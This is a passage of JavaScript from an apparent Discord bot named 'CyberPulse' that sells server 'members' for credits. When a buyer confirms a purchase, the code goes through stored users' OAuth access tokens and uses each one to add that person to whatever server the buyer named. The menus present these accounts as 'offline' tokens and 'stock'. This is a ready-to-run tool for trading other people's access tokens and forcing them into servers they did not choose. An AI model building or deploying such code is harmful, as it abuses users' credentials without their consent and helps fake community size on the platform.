        const modal = new ModalBuilder()
          .setCustomId('modal_server_id')
          .setTitle('CyberPulse Scan 🚀');

        const serverIdInput = new TextInputBuilder()
          .setCustomId('input_server_id')
          .setLabel('Server ID')
          .setStyle(TextInputStyle.Short)
          .setPlaceholder('Ex: 1285560083786371085')
          .setRequired(true);

        modal.addComponents(new ActionRowBuilder().addComponents(serverIdInput));
        return await interaction.showModal(modal);
      }

      if (interaction.customId === 'workflow_cancel') {
        activeSessions.delete(interaction.user.id);
        return interaction.update({ content: '❌ Operation cancelled.', embeds: [], components: [] });
      }

      if (interaction.customId === 'btn_confirm_purchase') {
        const session = activeSessions.get(interaction.user.id);
        if (!session) return interaction.reply({ content: '❌ Session expired. Please start again.', ephemeral: true });

        let uc = await UserCredit.findOne({ discordId: interaction.user.id });
        if (!uc || uc.balance < session.quantity) {
          return interaction.update({ content: `❌ Insufficient credits. You need **${session.quantity}** credits, but your balance is **${uc ? uc.balance : 0}**.`, embeds: [], components: [] });
        }

        uc.balance -= session.quantity;
        uc.offlineConsumed += session.quantity; // Track consumption
        await uc.save();

        await interaction.update({ content: `Adding members ⏳\nProgress: 0/${session.quantity}\n🆔 Operation: \`${session.opId}\``, embeds: [], components: [] });

        try {
          const targetGuild = await client.guilds.fetch(session.serverId);
          const verifiedUsers = await VerifiedUser.find({});
          let successful = 0;
          const startTimePull = Date.now();

          for (const userRecord of verifiedUsers) {
            if (successful >= session.quantity) break;
            try {
              const member = await targetGuild.members.fetch(userRecord.discordId).catch(() => null);
              if (member) continue;

              await targetGuild.members.add(userRecord.discordId, { accessToken: userRecord.accessToken });
              successful++;

              if (successful % 5 === 0 || successful === session.quantity) {
                await interaction.editReply({
                  content: `Adding members ⏳\nProgress: ${successful}/${session.quantity}\n🆔 Operation: \`${session.opId}\``
                }).catch(() => {});
              }
              await new Promise(r => setTimeout(r, 600));
            } catch (err) {}
          }

          const timeTaken = ((Date.now() - startTimePull) / 1000).toFixed(1);
          const reportEmbed = new EmbedBuilder()
            .setColor(0x10b981)
            .setTitle('✅ Members added successfully! 🚀')
            .addFields(
              { name: '📊 Accounts Added', value: `\`${successful} accounts\``, inline: true },
              { name: '💳 Remaining Balance', value: `\`${uc.balance} credits\``, inline: true },
              { name: '⏱️ Time Taken', value: `\`${timeTaken}s\``, inline: true }
            )
            .setTimestamp();

          await interaction.editReply({ content: null, embeds: [reportEmbed] });
          activeSessions.delete(interaction.user.id);

        } catch (err) {
          await interaction.editReply({ content: '❌ Critical error executing member addition.' });
        }
      }

      if (interaction.customId === 'btn_cancel_purchase') {
        activeSessions.delete(interaction.user.id);
        return interaction.update({ content: '❌ Operation cancelled.', embeds: [], components: [] });
      }
    }

    // 3. Modal Submissions
    if (interaction.isModalSubmit()) {
      if (interaction.customId === 'modal_server_id') {
        const serverId = interaction.fields.getTextInputValue('input_server_id');
        activeSessions.set(interaction.user.id, { serverId });

        const totalStock = await VerifiedUser.countDocuments();

        const selectMenu = new StringSelectMenuBuilder()
          .setCustomId('select_token_type')
          .setPlaceholder('Select token type')
          .addOptions(
            new StringSelectMenuOptionBuilder()
              .setLabel('offline')
              .setDescription(`1000/${totalStock}`)
              .setValue('offline')
          );

        const row1 = new ActionRowBuilder().addComponents(selectMenu);
        const row2 = new ActionRowBuilder().addComponents(
          new ButtonBuilder().setCustomId('workflow_cancel').setLabel('Cancel').setStyle(ButtonStyle.Danger)
        );

        return interaction.reply({ 
          content: `Please select the token type you want to buy ⚡`, 
          components: [row1, row2], 
          ephemeral: true 
        });
      }

      if (interaction.customId === 'modal_quantity') {
        const qtyStr = interaction.fields.getTextInputValue('input_quantity');
        const quantity = parseInt(qtyStr, 10);
        const session = activeSessions.get(interaction.user.id);

        if (!session) {
          return interaction.reply({ content: '❌ Session expired. Please click Add Members again.', ephemeral: true });
        }

        if (isNaN(quantity) || quantity <= 0) {
          return interaction.reply({ content: '❌ Invalid quantity entered.', ephemeral: true });
        }

        let uc = await UserCredit.findOne({ discordId: interaction.user.id });
        const userBalance = uc ? uc.balance : 0;

        if (quantity > userBalance) {
          return interaction.reply({ content: `❌ Error: You requested **${quantity}** members, but your current balance is only **${userBalance}** credits.`, ephemeral: true });
        }

        session.quantity = quantity;
        session.opId = `OP-${Math.random().toString(36).substring(2, 10).toUpperCase()}-${Math.random().toString(36).substring(2, 6).toUpperCase()}`;

        const totalStock = await VerifiedUser.countDocuments();
        let guildName = 'Unknown Guild';
        try {
          const g = await client.guilds.fetch(session.serverId);
          guildName = g.name;
        } catch (e) {}

        const confirmEmbed = new EmbedBuilder()
          .setColor(0x10b981)
          .setTitle(`Confirm Addition — ${session.tokenType} ⚡`)
          .addFields(
            { name: '🏰 Server', value: `${guildName}\n\`${session.serverId}\``, inline: true },
            { name: '👥 Current Members', value: '0', inline: true },
            { name: '📦 Available Accounts', value: `${totalStock}`, inline: true },
            { name: '🔢 Add Count', value: `${quantity}`, inline: true },
            { name: '💵 Cost', value: `${quantity} 📦`, inline: true },
            { name: '💳 Your Balance', value: `${userBalance} 📦`, inline: true }
          );

        const row = new ActionRowBuilder().addComponents(
          new ButtonBuilder().setCustomId('btn_confirm_purchase').setLabel('Purchase').setStyle(ButtonStyle.Success),
          new ButtonBuilder().setCustomId('btn_cancel_purchase').setLabel('Cancel').setStyle(ButtonStyle.Danger)
        );

        return interaction.reply({ embeds: [confirmEmbed], components: [row], ephemeral: true });
      }
    }

    // 4. String Select Menu
    if (interaction.isStringSelectMenu()) {
      if (interaction.customId === 'select_token_type') {
        const tokenType = interaction.values[0];
        const session = activeSessions.get(interaction.user.id);
        if (!session) return interaction.reply({ content: '❌ Session expired.', ephemeral: true });

        session.tokenType = tokenType;
        const totalStock = await VerifiedUser.countDocuments();

        const modal = new ModalBuilder()
          .setCustomId('modal_quantity')
          .setTitle('CyberPulse Buy Members 🚀');

        const qtyInput = new TextInputBuilder()
          .setCustomId('input_quantity')
          .setLabel('Quantity')
          .setStyle(TextInputStyle.Short)
          .setPlaceholder(`Stock : ${totalStock}`)
          .setRequired(true);

        modal.addComponents(new ActionRowBuilder().addComponents(qtyInput));
        return await interaction.showModal(modal);
      }
    }
  } catch (err) {
    console.error('❌ Interaction Error:', err);
    if (!interaction.replied && !interaction.deferred) {
      await interaction.reply({ content: '❌ An error occurred while running this interaction.', ephemeral: true }).catch(() => {});
    }
  }
});

client.login(TOKEN);
